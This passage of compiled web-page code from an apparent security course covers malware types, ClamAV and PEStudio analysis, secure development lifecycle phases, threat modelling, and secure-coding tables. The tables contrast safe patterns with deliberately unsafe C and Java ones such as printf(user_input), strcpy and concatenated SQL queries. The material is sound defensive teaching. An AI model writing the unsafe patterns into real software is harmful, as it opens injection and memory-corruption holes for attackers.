            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Trojan"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Social engineering"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Registry, services"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Backdoor, theft"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Medium (behavioral)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "User training, AppLocker"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Ransomware"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Phishing, exploits"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Shadow copy deletion"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "File encryption"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Medium (file I/O spike)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Backups, EDR, ASR rules"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Rootkit"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Post-exploitation install"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Kernel hooks, DKOM"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Hide presence"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "High (memory forensics)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Secure Boot, memory integrity"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Botnet"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Worm + exploit"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "C2, DGA"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "DDoS, spam, mining"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "High (encrypted C2)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "DNS sinkhole, network monitoring"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "RAT"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Trojan delivery"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Auto-run, services"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Remote control"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Medium (network traffic)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "EDR, network segmentation"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Spyware"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Bundled, drive-by"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "BHO, registry"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Keylogging, theft"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Low-Medium"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Anti-spyware, browser policies"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Adware"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Bundled software"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Registry, toolbars"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Unwanted ads"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Low (PUP detection)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Ad-blocker, security awareness"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Fileless"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Exploit, macro"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "WMI, registry"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Varied (memory)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "High (memory-only)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "PowerShell logging, AMSI"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "53-practical-malware-analysis-with-clamav",
      children: "5.3 Practical Malware Analysis with ClamAV"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
        children: "# Install ClamAV\napt-get install clamav clamav-daemon\n\n# Update virus definitions\nfreshclam\n\n# Scan a directory\nclamscan -r --bell -i /home/user/suspicious/\n\n# Scan with verbose output\nclamscan --verbose --infected --log=scan.log C:\\samples\\\n\n# Real-time file scanning\nclamdscan --fdpass --multiscan /home/user/downloads/\n\n# Scan a specific file\nclamscan suspicious-file.exe\n\n# Sample output\n----------- SCAN SUMMARY -----------\nKnown viruses: 8654123\nEngine version: 1.0.1\nScanned directories: 12\nScanned files: 45\nInfected files: 2\nTotal errors: 0\nData scanned: 156.23 MB\nData read: 89.45 MB (ratio 1.75:1)\nTime: 32.456 sec (0 m 32 s)\nStart Date: 2024:01:15 14:30:22\nEnd Date:   2024:01:15 14:30:55\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "54-practical-pestudio-and-hashdiff-analysis",
      children: "5.4 Practical: PEStudio and HashDiff Analysis"
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "PEStudio"
      }), " performs static analysis on Windows PE files without executing them:"]
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        children: "Key PEStudio indicators:\n- Entropy > 7.0 in sections → packed/encrypted\n- TLS callbacks → anti-debugging\n- Suspicious imports: VirtualAlloc, CreateRemoteThread, WriteProcessMemory\n- Rich header mismatch → masquerading\n- Untrusted digital signature → trojanized software\n- High string entropy → obfuscated/encoded payloads\n"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "HashDiff"
      }), " compares file hashes to detect binary changes:"]
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-powershell",
        children: "# Calculate hashes\nGet-FileHash -Path malware.exe -Algorithm SHA256\nGet-FileHash -Path original.exe -Algorithm SHA256\n\n# Compare with known hashes\nGet-FileHash -Path sample.exe -Algorithm MD5\n# -> Compare against VirusTotal/MalwareBazaar hash database\n\n# Find identical files (hash matching)\nGet-ChildItem -Path . -Recurse -File | Get-FileHash -Algorithm MD5 | Group-Object Hash\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
      id: "section-6-secure-software-development-lifecycle",
      children: "Section 6: Secure Software Development Lifecycle"
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "61-ssdlc-phases",
      children: "6.1 SSDLC Phases"
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Analogy:"
      }), " Building secure software is like constructing a fortress. You don't add defenses after the castle is built → you design moats into the blueprints, use fire-resistant stone during construction, test the drawbridge before opening, and maintain patrols year after year."]
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-mermaid",
        children: "flowchart LR\n    A[Requirements] --> B[Design]\n    B --> C[Implementation]\n    C --> D[Testing]\n    D --> E[Deployment]\n    E --> F[Maintenance]\n    F -.-> A\n    style A fill:#fce4ec\n    style B fill:#fff3e0\n    style C fill:#c8e6c9\n    style D fill:#e1f5fe\n    style E fill:#f3e5f5\n    style F fill:#ffe0b2\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h4, {
      id: "phase-1-requirements",
      children: "Phase 1: Requirements"
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Activity"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "What It Covers"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Security requirements"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Authentication, authorization, encryption, logging"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Privacy requirements"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Data classification, PII handling, GDPR/CCPA compliance"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Compliance mapping"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "PCI-DSS, HIPAA, SOC2, FedRAMP"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Abuse cases"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "\"What if someone tries to misuse this?\""
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Security acceptance criteria"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Definition of \"secure enough\""
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.h4, {
      id: "phase-2-design--threat-modeling",
      children: "Phase 2: Design → Threat Modeling"
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "STRIDE"
      }), " (Microsoft):"]
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Category"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Violates"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Example"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsxs)(_components.td, {
            children: [(0,jsx_runtime.jsx)(_components.strong, {
              children: "S"
            }), "poofing"]
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Authentication"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Fake user identity"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsxs)(_components.td, {
            children: [(0,jsx_runtime.jsx)(_components.strong, {
              children: "T"
            }), "ampering"]
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Integrity"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Modify data in transit"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsxs)(_components.td, {
            children: [(0,jsx_runtime.jsx)(_components.strong, {
              children: "R"
            }), "epudiation"]
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Non-repudiation"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Deny performing an action"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsxs)(_components.td, {
            children: [(0,jsx_runtime.jsx)(_components.strong, {
              children: "I"
            }), "nformation Disclosure"]
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Confidentiality"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Leak credit card numbers"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsxs)(_components.td, {
            children: [(0,jsx_runtime.jsx)(_components.strong, {
              children: "D"
            }), "enial of Service"]
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Availability"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Crash the server"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsxs)(_components.td, {
            children: [(0,jsx_runtime.jsx)(_components.strong, {
              children: "E"
            }), "levation of Privilege"]
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Authorization"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "User becomes admin"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "DREAD"
      }), " (Risk Scoring):"]
    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "D"
        }), "amage Potential → how severe is the damage?"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "R"
        }), "eproducibility → how reliably can the attack succeed?"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "E"
        }), "xploitability → how easy is it to launch?"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "A"
        }), "ffected Users → how many users are impacted?"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "D"
        }), "iscoverability → how likely is the vulnerability to be found?"]
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: "Each rated 1-10, summed for priority."
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "PASTA"
      }), " (Process for Attack Simulation and Threat Analysis):\nA 7-stage risk-centric methodology:"]
    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Define business objectives"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Define technical scope"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Decompose application"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Threat analysis"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Vulnerability analysis"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Attack modeling"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Risk and impact analysis"
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.h4, {
      id: "phase-3-implementation--secure-coding-standards",
      children: "Phase 3: Implementation → Secure Coding Standards"
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: "See Section 6.2 for language-specific guidelines."
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Activity"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Tool/Technique"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Static analysis (SAST)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Flawfinder, RATS, SonarQube, Fortify"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "IDE security plugins"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "FindSecBugs (Java), Brakeman (Rails)"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Pre-commit hooks"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "git-secrets, trufflehog for secrets"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Code review checklist"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "OWASP ASVS (Application Security Verification Standard)"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Dependency scanning"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "OWASP Dependency-Check, Snyk"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.h4, {
      id: "phase-4-testing",
      children: "Phase 4: Testing"
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Activity"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Tool/Technique"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Dynamic analysis (DAST)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "OWASP ZAP, Burp Suite"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Fuzz testing"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "AFL, libFuzzer, OSS-Fuzz"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Penetration testing"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Manual + automated (Metasploit)"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "SAST integration"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "CI/CD pipeline gate"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Secret scanning"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Pre-commit + CI (trufflehog, gitleaks)"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.h4, {
      id: "phase-5-deployment",
      children: "Phase 5: Deployment"
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Activity"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Implementation"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Hardened base images"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "CIS benchmark AMIs, Docker slim images"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Immutable infrastructure"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "No in-place updates; redeploy"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Secrets management"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "HashiCorp Vault, AWS Secrets Manager, Azure Key Vault"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Minimal runtime"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Distroless containers, --no-install-recommends"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Read-only filesystem"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Container rootfs read-only, tmpfs for /tmp"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.h4, {
      id: "phase-6-maintenance",
      children: "Phase 6: Maintenance"
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Activity"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Frequency"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Vulnerability scanning"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Weekly"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Patch management"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Monthly (emergency: 48h for critical)"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Penetration testing"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Annually / after major changes"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Incident response drills"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Quarterly"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Dependency refresh"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Monthly (Dependabot, Renovate)"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "62-secure-coding-practices-ccjavajs",
      children: "6.2 Secure Coding Practices (C/C++/Java/JS)"
    }), "\n", (0,jsx_runtime.jsx)(_components.h4, {
      id: "621-cc",
      children: "6.2.1 C/C++"
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Practice"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Unsafe"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Safe"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "String copy"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.code, {
              children: "strcpy(dst, src)"
            })
          }), (0,jsx_runtime.jsxs)(_components.td, {
            children: [(0,jsx_runtime.jsx)(_components.code, {
              children: "strncpy(dst, src, n)"
            }), " or ", (0,jsx_runtime.jsx)(_components.code, {
              children: "strlcpy"
            })]
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "String format"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.code, {
              children: "printf(user_input)"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.code, {
              children: "printf(\"%s\", user_input)"
            })
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Integer handling"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.code, {
              children: "int len = atoi(input)"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Check overflow before allocation"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Memory free"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.code, {
              children: "free(ptr); /* use ptr */"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.code, {
              children: "free(ptr); ptr = NULL;"
            })
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Array bounds"
          }), (0,jsx_runtime.jsxs)(_components.td, {
            children: [(0,jsx_runtime.jsx)(_components.code, {
              children: "arr[i]"
            }), " without bounds check"]
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.code, {
              children: "if (i < size) arr[i]"
            })
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "File operations"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.code, {
              children: "fopen(user_input)"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Validate/whitelist filename"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Example: Safe string handling in C:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-c",
        children: "void safe_copy(char *input, size_t input_len) {\n    char buffer[64];\n    if (input_len >= sizeof(buffer)) {\n        fprintf(stderr, \"Input too long (%zu bytes)\\n\", input_len);\n        return;  // or: safely truncate\n    }\n    memcpy(buffer, input, input_len);\n    buffer[input_len] = '\\0';\n}\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h4, {
      id: "622-java",
      children: "6.2.2 Java"
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Practice"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Unsafe"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Safe"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "SQL queries"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.code, {
              children: "Statement.executeQuery(\"SELECT * FROM users WHERE id = \" + id)"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.code, {
              children: "PreparedStatement.executeQuery(\"SELECT * FROM users WHERE id = ?\")"
            })
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Deserialization"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.code, {
              children: "ObjectInputStream.readObject()"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Validate class whitelist"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "File paths"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.code, {
              children: "new File(userInput)"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Canonicalize, validate parent path"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Reflection"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.code, {
              children: "Class.forName(userInput).newInstance()"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Validate/whitelist class names"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Example: Secure deserialization:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-java",
